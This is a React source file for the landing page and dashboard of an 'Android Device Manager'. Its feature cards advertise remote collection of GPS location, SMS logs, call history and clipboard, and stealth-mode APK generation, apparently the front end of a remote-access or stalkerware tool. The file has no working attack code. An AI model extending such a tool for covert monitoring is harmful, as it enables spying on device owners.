import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { getLoginUrl } from "@/const";
import { Lock, Smartphone, Zap, Shield, Activity, Code } from "lucide-react";

export default function Home() {
  const { user, isAuthenticated, logout } = useAuth();

  if (isAuthenticated && user) {
    return (
      <div className="min-h-screen bg-background text-foreground">
        {/* Navigation */}
        <nav className="border-b border-glow-cyan bg-card/50 backdrop-blur">
          <div className="container flex items-center justify-between py-4">
            <div className="flex items-center gap-3">
              <Smartphone className="w-8 h-8 glow-cyan" />
              <h1 className="text-2xl font-bold gradient-text">Android Device Manager</h1>
            </div>
            <div className="flex items-center gap-4">
              <span className="text-sm text-muted-foreground">Welcome, {user.name}</span>
              <Button onClick={logout} variant="outline" size="sm">
                Logout
              </Button>
            </div>
          </div>
        </nav>

        {/* Main Content */}
        <main className="container py-12">
          <div className="grid gap-8">
            {/* Welcome Section */}
            <section className="card-neon">
              <div className="flex items-start justify-between">
                <div>
                  <h2 className="text-3xl font-bold mb-2">Welcome to Android Device Manager</h2>
                  <p className="text-muted-foreground mb-6">
                    Advanced remote monitoring and control platform for Android devices with real-time tracking,
                    security monitoring, and APK generation capabilities.
                  </p>
                  <div className="flex gap-3">
                    <Button className="btn-neon">Get Started</Button>
                    <Button className="btn-neon-cyan" variant="outline">
                      Learn More
                    </Button>
                  </div>
                </div>
                <Zap className="w-12 h-12 glow-magenta flex-shrink-0" />
              </div>
            </section>

            {/* Features Grid */}
            <section className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {/* Device Management */}
              <div className="card-neon-cyan group hover:shadow-lg transition-all duration-300">
                <div className="flex items-start gap-4">
                  <Smartphone className="w-8 h-8 glow-cyan flex-shrink-0 mt-1" />
                  <div>
                    <h3 className="font-bold text-lg mb-2">Device Management</h3>
                    <p className="text-sm text-muted-foreground">
                      Register, monitor, and manage multiple Android devices with real-time status updates and
                      comprehensive device information.
                    </p>
                  </div>
                </div>
              </div>

              {/* Real-time Monitoring */}
              <div className="card-neon group hover:shadow-lg transition-all duration-300">
                <div className="flex items-start gap-4">
                  <Activity className="w-8 h-8 glow-purple flex-shrink-0 mt-1" />
                  <div>
                    <h3 className="font-bold text-lg mb-2">Real-time Monitoring</h3>
                    <p className="text-sm text-muted-foreground">
                      Monitor GPS location, SMS logs, call history, clipboard activity, and more with live WebSocket
                      updates.
                    </p>
                  </div>
                </div>
              </div>

              {/* Security & Permissions */}
              <div className="card-neon-cyan group hover:shadow-lg transition-all duration-300">
                <div className="flex items-start gap-4">
                  <Shield className="w-8 h-8 glow-cyan flex-shrink-0 mt-1" />
                  <div>
                    <h3 className="font-bold text-lg mb-2">Security & Permissions</h3>
                    <p className="text-sm text-muted-foreground">
                      Role-based access control with granular permissions, 2FA authentication, and comprehensive audit
                      logs.
                    </p>
                  </div>
                </div>
              </div>

              {/* APK Builder */}
              <div className="card-neon group hover:shadow-lg transition-all duration-300">
                <div className="flex items-start gap-4">
                  <Code className="w-8 h-8 glow-magenta flex-shrink-0 mt-1" />
                  <div>
                    <h3 className="font-bold text-lg mb-2">APK Builder</h3>
                    <p className="text-sm text-muted-foreground">
                      Generate customized APK files directly from the browser with stealth mode, SSL/TLS, and
                      multi-port support.
                    </p>
                  </div>
                </div>
              </div>

              {/* Geofencing */}
              <div className="card-neon-cyan group hover:shadow-lg transition-all duration-300">
                <div className="flex items-start gap-4">
                  <Lock className="w-8 h-8 glow-cyan flex-shrink-0 mt-1" />
                  <div>
                    <h3 className="font-bold text-lg mb-2">Geofencing</h3>
                    <p className="text-sm text-muted-foreground">
                      Set up location-based alerts and geofences with entry/exit notifications and historical tracking.
                    </p>
                  </div>
                </div>
              </div>

              {/* Audit Logs */}
              <div className="card-neon group hover:shadow-lg transition-all duration-300">
                <div className="flex items-start gap-4">
                  <Activity className="w-8 h-8 glow-purple flex-shrink-0 mt-1" />
                  <div>
                    <h3 className="font-bold text-lg mb-2">Audit Logs</h3>
                    <p className="text-sm text-muted-foreground">
                      Complete audit trail of all user actions and device monitoring activities with detailed
                      timestamps and metadata.
                    </p>
                  </div>
                </div>
              </div>
            </section>

            {/* Quick Actions */}
            <section className="border-glow p-6 rounded-lg">
              <h3 className="text-xl font-bold mb-4 glow-cyan">Quick Actions</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                <Button className="btn-neon-cyan w-full">Register Device</Button>
                <Button className="btn-neon w-full">View Devices</Button>
                <Button className="btn-neon-cyan w-full">Generate APK</Button>
                <Button className="btn-neon w-full">View Logs</Button>
              </div>
            </section>

            {/* Status Indicator */}
            <section className="card-neon-cyan">
              <div className="flex items-center gap-3">
                <div className="status-online animate-pulse"></div>
                <div>
                  <p className="font-bold">System Status</p>
                  <p className="text-sm text-muted-foreground">All systems operational</p>
                </div>
              </div>
            </section>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background text-foreground flex flex-col">
      {/* Header */}
      <header className="border-b border-glow-cyan bg-card/50 backdrop-blur">
        <div className="container py-6">
          <div className="flex items-center gap-3">
            <Smartphone className="w-10 h-10 glow-cyan" />
            <h1 className="text-3xl font-bold gradient-text">Android Device Manager</h1>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <main className="flex-1 flex items-center justify-center">
        <div className="container max-w-4xl py-20">
          <div className="card-neon text-center">
            <div className="mb-8">
              <Zap className="w-16 h-16 glow-magenta mx-auto mb-6" />
              <h2 className="text-4xl font-bold mb-4">Advanced Android Device Management</h2>
              <p className="text-lg text-muted-foreground mb-8 max-w-2xl mx-auto">
                Enterprise-grade platform for remote monitoring, control, and management of Android devices with
                real-time tracking, security monitoring, and APK generation capabilities.
              </p>
            </div>

            {/* Features Preview */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
              <div className="border-glow-cyan p-4 rounded">
                <Shield className="w-6 h-6 glow-cyan mx-auto mb-2" />
                <h3 className="font-bold mb-1">Secure & Encrypted</h3>
                <p className="text-sm text-muted-foreground">JWT + 2FA Authentication</p>
              </div>
              <div className="border-glow p-4 rounded">
                <Activity className="w-6 h-6 glow-purple mx-auto mb-2" />
                <h3 className="font-bold mb-1">Real-time Updates</h3>
                <p className="text-sm text-muted-foreground">WebSocket Live Monitoring</p>
              </div>
              <div className="border-glow-cyan p-4 rounded">
                <Code className="w-6 h-6 glow-cyan mx-auto mb-2" />
                <h3 className="font-bold mb-1">APK Builder</h3>
                <p className="text-sm text-muted-foreground">Custom APK Generation</p>
              </div>
              <div className="border-glow p-4 rounded">
                <Lock className="w-6 h-6 glow-purple mx-auto mb-2" />
                <h3 className="font-bold mb-1">RBAC System</h3>
                <p className="text-sm text-muted-foreground">Granular Permissions</p>
              </div>
            </div>

            {/* CTA Button */}
            <a href={getLoginUrl()}>
              <Button className="btn-neon-cyan text-lg px-8 py-6">
                Login with Manus
              </Button>
            </a>

            {/* Footer Info */}
            <p className="text-xs text-muted-foreground mt-8">
              ⚠️ Educational Use Only - Requires explicit device owner consent
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-glow-cyan bg-card/50 backdrop-blur">
        <div className="container py-6 text-center text-sm text-muted-foreground">
          <p>Android Device Manager © 2024 - Advanced Remote Management Platform</p>
        </div>
      </footer>
    </div>
  );
}
